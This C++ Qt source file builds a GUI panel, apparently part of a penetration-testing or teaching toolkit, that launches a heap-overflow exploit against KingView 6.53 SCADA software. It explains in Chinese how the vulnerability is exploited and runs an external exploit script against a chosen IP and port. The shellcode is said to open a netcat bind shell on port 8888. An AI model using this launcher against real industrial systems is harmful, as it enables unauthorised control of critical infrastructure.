#include "kingview.h"

extern QString getcurrenttime();

kingview::kingview(QWidget *parent) : QWidget(parent)
{
    // 初始化页面
      initWidget();

      // 将功能页面存放到堆栈里
      m_stackWidget = new QStackedWidget();
      m_stackWidget->addWidget(m_widget);

      // 设置本页的主界面排版
      QHBoxLayout *main_layout = new QHBoxLayout();
      main_layout->addWidget(m_stackWidget);
      main_layout->setStretchFactor(m_stackWidget, 4);
      main_layout->setContentsMargins(0,0,0,0);
      setLayout(main_layout);

      connect(m_buttonkingview, SIGNAL(clicked()), this, SLOT(exploit()));

      this->setAutoFillBackground(true);

}

void kingview::initWidget()
{
    m_widget = new QWidget();

    m_textResult = new QTextBrowser();
    m_textResult->setFixedSize(780,200);
    m_textResult->setReadOnly(true);

    m_inputIp = new QLineEdit();
    m_inputIp->setText("192.168.33.128");
    m_inputIp->setFixedSize(150, 24);

    m_inputPort = new QLineEdit();
    m_inputPort->setText("777");
    m_inputPort->setFixedSize(100, 24);

    // 设置
    QFont fontButton;
    fontButton.setPointSize(13);
    m_buttonkingview= new QPushButton();
    m_buttonkingview->setText(tr("KingView漏洞利用"));
    m_buttonkingview->setFont(fontButton);


    // 水平布局-1
    QHBoxLayout *widget_1_H_layout = new QHBoxLayout();
    QLabel * labelprinciple = new QLabel();
    labelprinciple->setText("KingView 6.53漏洞原理:\n  KingView堆溢出漏洞可以被成功利用的原因，是程序在分配堆块后在块尾维持了一个数据结构，而其中包括一个函数指针\n"
                            "地址，程序之后会根据这个地址去执行相应的函数，渗透利用代码通过堆溢出漏洞覆盖这个函数指针，使Shellcode得以执行。\n\n"
                            "缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运\n"
                            "行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法\n"
                            "操作。通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，造成程序崩溃或使程序转而执行其\n"
                            "它指令，以达到攻击的目的");

    widget_1_H_layout->addWidget(labelprinciple);//, 0, Qt::AlignLeft);

    QHBoxLayout *widget_2_H_layout = new QHBoxLayout();
    QLabel * labeluser = new QLabel();
    labeluser->setText("KingView漏洞IP：");
    widget_2_H_layout->addWidget(labeluser, 0, Qt::AlignLeft);
    widget_2_H_layout->addWidget(m_inputIp,0,Qt::AlignLeft);//, 70, Qt::AlignRight);

    QLabel * label = new QLabel();
    label->setText("KingView端口号：");
    widget_2_H_layout->addWidget(label);//, 0, Qt::AlignLeft);
    widget_2_H_layout->addWidget(m_inputPort,0,Qt::AlignLeft);//, 70, Qt::AlignRight);
    widget_2_H_layout->addWidget(m_buttonkingview);

    widget_2_H_layout->setContentsMargins(20, 5, 20, 5);

    // 垂直布局
    QVBoxLayout *widget_1_V_layout = new QVBoxLayout();
    widget_1_V_layout->addLayout(widget_1_H_layout);
    widget_1_V_layout->addLayout(widget_2_H_layout);
    widget_1_V_layout->addWidget(m_textResult);//, 0, Qt::AlignTop);
//    widget_1_V_layout->setContentsMargins(20, 5, 20, 5);
//    widget_1_V_layout->addStretch();
    QHBoxLayout *main_layout = new QHBoxLayout();
    main_layout->addLayout(widget_1_V_layout);
    m_widget->setLayout(main_layout);
}

void kingview::appendOutput(QString output) {
    output = "["+getcurrenttime()+"] "+output+"\n";
    QString strOldRecord = m_textResult->toPlainText().left(1024);
    m_textResult->setPlainText(strOldRecord + output);
    m_textResult->moveCursor(QTextCursor::End);
}

int kingview::exploit()
{
    QString cmd = "python KingView-6-5-3-SCADA-Heap_overflow.py ";
    cmd+=m_inputIp->text();
    cmd+=" ";
    cmd+=m_inputPort->text();
    cmd+="\n";

    appendOutput(cmd);
    appendOutput("利用kingview漏洞，本程序将执行shellcode启动一个NC服务，端口号为8888,请启动一个新终端输入:nc ip地址 8888进行验证。");

    appendOutput(runcmd(cmd));
}

QString kingview::runcmd(QString command)
{
    QProcess p(0);
    p.start(command);
    p.waitForStarted();
    p.waitForFinished();
    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
    return strTemp;
}

